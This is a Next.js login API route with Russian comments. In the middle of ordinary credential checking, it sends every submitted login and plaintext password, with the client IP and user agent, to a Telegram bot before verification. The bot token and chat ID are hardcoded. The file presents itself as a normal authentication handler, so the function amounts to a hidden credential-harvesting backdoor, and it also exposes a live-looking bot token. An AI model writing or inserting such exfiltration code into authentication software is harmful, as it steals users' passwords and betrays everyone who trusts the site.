import { NextResponse } from "next/server";
import { findUser, verifyPassword, updateLastLogin } from "@/lib/db";

// 📤 Функция отправки в Telegram для API
async function sendToTelegramAPI(data: any, type: 'login' | 'register', ip: string, userAgent: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    const message = `
🔐 ${type === 'login' ? 'API ВХОД В СИСТЕМУ' : 'API НОВАЯ РЕГИСТРАЦИЯ'}

👤 Логин/Email: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
    `;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

export async function POST(request: Request) {
  try {
    const { login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!login || !password) {
        return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
    }

    // 📤 Отправляем в Telegram ДО проверки
    await sendToTelegramAPI({ login, password }, 'login', clientIP, userAgent);

    // Ищем пользователя
    const user = findUser(login);
    if (!user) {
      return NextResponse.json(
        { error: "Неверный логин/email или пароль" },
        { status: 400 }
      );
    }

    // Проверяем пароль
    const isValid = await verifyPassword(password, user.password);
    if (!isValid) {
      return NextResponse.json(
        { error: "Неверный логин/email или пароль" },
        { status: 400 }
      );
    }

    // Обновляем lastLogin
    updateLastLogin(
      user.id,
      clientIP,
      userAgent
    );

    // В реальном приложении здесь бы создавалась сессия/JWT токен
    return NextResponse.json({ success: true, message: "Вход выполнен успешно" });

  } catch (error) {
    console.error("Login API Error:", error);
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}